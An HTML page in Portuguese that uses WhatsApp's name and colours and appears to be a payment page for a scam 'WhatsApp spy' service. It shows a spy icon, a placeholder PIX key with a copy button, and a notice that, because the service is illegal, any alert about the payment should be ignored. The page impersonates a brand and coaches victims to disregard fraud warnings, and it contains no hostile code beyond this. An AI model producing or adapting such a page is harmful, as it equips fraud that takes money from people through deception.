<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>WhatsApp</title>

<!-- Fonte profissional -->
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">

<style>
body {
  margin: 0;
  font-family: 'Poppins', sans-serif;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  overflow: hidden;

  background: linear-gradient(270deg, #c8f7e4, #a0f0d0, #c8f7e4);
  background-size: 600% 600%;
  animation: gradient 15s ease infinite;
}

@keyframes gradient {
  0% {background-position: 0% 50%;}
  50% {background-position: 100% 50%;}
  100% {background-position: 0% 50%;}
}

/* efeito de bolhas minimalistas */
body::before {
  content: "";
  position: absolute;
  width: 200%;
  height: 200%;
  background-image: radial-gradient(circle, rgba(255,255,255,0.3) 1px, transparent 1px);
  background-size: 40px 40px;
  animation: moveBg 30s linear infinite;
}

@keyframes moveBg {
  from {transform: translate(0,0);}
  to {transform: translate(-50px,-50px);}
}

.container {
  width: 100%;
  max-width: 700px;
  padding: 20px;
  position: relative;
  z-index: 2;
}

.card {
  background: rgba(255,255,255,0.95);
  backdrop-filter: blur(10px);
  padding: 60px;
  border-radius: 30px;
  text-align: center;
  box-shadow: 0 25px 60px rgba(0,0,0,0.2);
  animation: fadeIn 1s ease;
}

@keyframes fadeIn {
  from {opacity: 0; transform: translateY(20px);}
  to {opacity: 1; transform: translateY(0);}
}

.logo {
  font-size: 42px;
  font-weight: 700;
  color: #075E54;
  letter-spacing: 2px;
  margin-bottom: 10px;
}

/* espião estilizado */
.spy {
  width: 70px;
  margin: 15px auto;
  display: block;
}

.alert {
  font-size: 15px;
  color: #333;
  line-height: 1.7;
  margin-bottom: 30px;
  font-weight: 400;
}

.pix {
  background: #f8f8f8;
  padding: 22px;
  border-radius: 18px;
  font-size: 17px;
  word-break: break-all;
  margin-bottom: 30px;
  border: 1px solid #eee;
}

button {
  background: linear-gradient(135deg, #25D366, #1ebe5d);
  border: none;
  color: white;
  padding: 20px;
  width: 100%;
  border-radius: 18px;
  font-size: 18px;
  font-weight: 600;
  cursor: pointer;
  transition: 0.3s;
}

button:hover {
  transform: scale(1.05);
  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
}

.msg {
  margin-top: 15px;
  color: #1ebe5d;
  font-size: 15px;
}
</style>
</head>

<body>

<div class="container">
  <div class="card">

    <div class="logo">WhatsApp</div>

    <!-- ícone espião melhorado -->
    <svg class="spy" viewBox="0 0 64 64">
      <circle cx="32" cy="32" r="30" fill="#111"/>
      <circle cx="24" cy="28" r="6" fill="#fff"/>
      <circle cx="40" cy="28" r="6" fill="#fff"/>
      <rect x="18" y="40" width="28" height="6" rx="3" fill="#fff"/>
    </svg>

    <div class="alert">
      Devido à ilegalidade do serviço, a chave gerada não corresponde a uma chave validada padrão;
      assim, qualquer notificação ou alerta será causada pelo tipo específico de serviço executado,
      portanto ignore.
    </div>

    <div class="pix" id="pix">
      SUA_CHAVE_PIX_AQUI
    </div>

    <button onclick="copiarPix()">📋 Copiar PIX</button>

    <div class="msg" id="msg"></div>

  </div>
</div>

<script>
function copiarPix() {
  const pix = document.getElementById("pix").innerText;

  navigator.clipboard.writeText(pix).then(() => {
    document.getElementById("msg").innerText = "PIX copiado com sucesso!";
  }).catch(() => {
    document.getElementById("msg").innerText = "Erro ao copiar.";
  });
}
</script>

</body>
</html>
